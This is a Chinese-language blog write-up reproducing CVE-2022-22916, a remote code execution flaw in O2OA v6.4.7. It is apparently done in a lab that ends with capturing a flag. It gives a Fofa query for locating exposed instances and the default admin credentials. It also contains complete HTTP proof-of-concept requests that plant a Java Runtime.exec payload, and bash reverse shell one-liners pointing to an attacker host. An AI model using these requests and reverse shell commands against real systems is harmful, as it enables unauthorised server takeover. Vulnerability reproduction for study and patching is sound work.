---
title: CVE-2022-22916 O2OA RCE远程命令执行
date: 2023-02-17 10:01:58
tags: [CVE漏洞,O2OA,RCE]
categories: CVE漏洞复现
---

###  影响范围

O2OA v6.4.7

Fofa: title == "O2OA" 

<!--more -->

### 一、O2OA描述

O2OA是一个基于J2EE分布式架构，集成移动办公、智能办公，支持私有化部署，自适应负载能力的，能够很大程度上节约企业软件开发成本的基于AGPL协议开放源代码的企业信息化系统需求定制开发平台解决方案。

### 二、漏洞描述

通过 /x_program_center/jaxrs/invoke 发现 O2OA v6.4.7 包含一个远程代码执行 (RCE) 漏洞。

### 三、影响范围

O2OA v6.4.7

Fofa: title == "O2OA"

### 四、漏洞复现

**1.拉取CVE-2022-22916镜像**

![image-20230217100414629](CVE-2022-22916-O2OA-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230217100414629.png)

**2.访问80端口映射的端口**

![image-20230217111600901](CVE-2022-22916-O2OA-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230217111600901.png)

O2OA的默认用户名和密码为xadmin\o2

![image-20230217111707553](CVE-2022-22916-O2OA-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230217111707553.png)

成功登入

**3.添加接口**

进入服务管理界面

![image-20230217111831587](CVE-2022-22916-O2OA-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230217111831587.png)

我们在此使用burp抓包然后伪造并发送此poc：

```http
POST /x_program_center/jaxrs/invoke?v=6.3 HTTP/1.1
Host: [your target host]
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Authorization: [your authorization]
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 475

{"name":"abc","id":"abc","alias":"","description":"","isNewInvoke":true,"text":"\n\nvar s = [3];\ns[0] = \"/bin/bash\";\ns[1] = \"-c\";\ns[2] = \"[command]\";\nvar p = java.lang.Runtime.getRuntime().exec(s);\nvar sc = new java.util.Scanner(p.getInputStream(),\"GBK\").useDelimiter(\"\\\\A\");\nvar result = sc.hasNext() ? sc.next() : \"\";\nsc.close();","enableToken":false,"enable":true,"remoteAddrRegex":"","lastStartTime":"","lastEndTime":"","validated":true}
```

[command]中填写反弹shell命令

```
bash -i >& /dev/tcp/10.0.0.127/6666 0>&1\
```

点击接口配置后抓到的包：

![image-20230217112229092](CVE-2022-22916-O2OA-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230217112229092.png)

获取authorization的值

![image-20230217123359958](CVE-2022-22916-O2OA-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230217123359958.png)

成功发送poc

刷新页面发现多了此接口：

![image-20230217112514611](CVE-2022-22916-O2OA-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230217112514611.png)

**4.反弹shell**

开启kali监听

![image-20230217121222188](CVE-2022-22916-O2OA-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230217121222188.png)

调用命令的poc:

```http
POST /x_program_center/jaxrs/invoke/abc/execute?v=6.3 HTTP/1.1
Host: [your target host]
Content-Length: 0
Accept: text/html,application/json,*/*
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN
Authorization: [your authorization]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Content-Type: application/json; charset=UTF-8
Origin: http://[your target host]
Referer: http://[your target host]/x_desktop/index.html
Accept-Encoding: gzip, deflate
Cookie: 
Connection: close
```

此处由于cookie变更比较快直接在页面新建并运行：

```
var s = [3];
s[0] = "/bin/bash";
s[1] = "-c";
s[2] = "bash -i >& /dev/tcp/{kaliip}/{kaliport} 0>&1";
var p = java.lang.Runtime.getRuntime().exec(s);
var sc = new java.util.Scanner(p.getInputStream(),"GBK").useDelimiter("\\A");
var result = sc.hasNext() ? sc.next() : "";
sc.close();
```

![image-20230217124256072](CVE-2022-22916-O2OA-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230217124256072.png)

![image-20230217121458912](CVE-2022-22916-O2OA-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230217121458912.png)

反弹shell到攻击机上

查看id:

![image-20230217124325418](CVE-2022-22916-O2OA-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230217124325418.png)

**5.取得flag**

![image-20230217124401522](CVE-2022-22916-O2OA-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230217124401522.png)

本次漏洞复现到此结束
